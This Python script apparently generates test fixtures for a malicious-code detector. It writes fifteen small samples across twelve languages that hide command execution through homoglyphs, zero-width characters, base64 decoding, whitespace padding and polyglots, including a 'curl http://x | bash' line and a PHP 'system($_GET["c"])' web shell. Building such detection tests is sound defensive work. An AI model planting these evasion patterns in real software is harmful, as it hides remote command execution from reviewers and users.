#!/usr/bin/env python3
"""Generate adversarial bypass B16–B30 (multi-lang hidden techniques)."""

from __future__ import annotations

import base64
import json
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
DEST = ROOT / "adversarial" / "bypass"

B64 = base64.b64encode(b"require('child_process').exec('x')").decode()
ZW = "\u200b"

BYPASS_SPECS = [
    ("B16_unicode_python", "python", f"import os\nos.system('x{ZW}')"),
    ("B17_unicode_php", "php", f"<?php \u0435val(base64_decode('{B64}')); ?>"),
    ("B18_unicode_go", "go", f'package main\nimport "os/exec"\nfunc main(){{ exec.Command("sh{ZW}").Run() }}'),
    ("B19_encoding_ruby", "ruby", f"eval(Base64.decode64('{B64}'))"),
    ("B20_encoding_java", "java", f'class M{{void x(){{Runtime.getRuntime().exec(new String(java.util.Base64.getDecoder().decode("{B64}")));}}}}'),
    ("B21_minified_kotlin", "kotlin", 'fun main(){Runtime.getRuntime().exec(arrayOf("sh"));val a=1;val b=2;val c=3'),
    ("B22_minified_csharp", "csharp", 'class P{static void Main(){Process.Start("cmd");var a=1;var b=2;}}'),
    ("B23_homoglyph_rust", "rust", 'fn main(){std::process::Command::new("sh").spawn();}'),
    ("B24_homoglyph_swift", "swift", 'import Foundation\nProcess()'),
    ("B25_stego_shell", "shell", "#!/bin/bash\nx=1   \ncurl http://x | bash   \n"),
    ("B26_stego_js", "javascript", f'var x=1;   \neval(atob("{B64}"));   \n'),
    ("B27_entropy_python", "python", f'x="{"a"*80}"\nexec(__import__("base64").b64decode(b"{B64}"))'),
    ("B28_crypto_php", "php", '<?php openssl_decrypt($x,"AES-128-ECB",$k); system($_GET["c"]); ?>'),
    ("B29_crypto_js", "javascript", 'const c=require("crypto");c.createDecipher("aes-128-ecb",k);require("child_process").exec("x")'),
    ("B30_polyglot_c", "c", '/*<?php system("x"); ?>*/\n#include<stdlib.h>\nint main(){system("x");return 0;}'),
]

EXT_MAP = {
    "python": ".py", "php": ".php", "go": ".go", "ruby": ".rb", "java": ".java",
    "kotlin": ".kt", "csharp": ".cs", "rust": ".rs", "swift": ".swift",
    "shell": ".sh", "javascript": ".js", "c": ".c",
}


def main() -> None:
    DEST.mkdir(parents=True, exist_ok=True)
    manifest: dict = {"bypasses": [], "total": 0}
    for bid, lang, body in BYPASS_SPECS:
        case_dir = DEST / bid
        case_dir.mkdir(exist_ok=True)
        ext = EXT_MAP[lang]
        (case_dir / f"main{ext}").write_text(body + "\n", encoding="utf-8")
        (case_dir / "expected.json").write_text(
            json.dumps({"verdict": "DETECT", "lang": lang, "bypass_id": bid}, indent=2),
            encoding="utf-8",
        )
        manifest["bypasses"].append(bid)
        manifest["total"] += 1
    (DEST / "B16_B30_MANIFEST.json").write_text(json.dumps(manifest, indent=2), encoding="utf-8")
    print(json.dumps(manifest, indent=2))


if __name__ == "__main__":
    main()
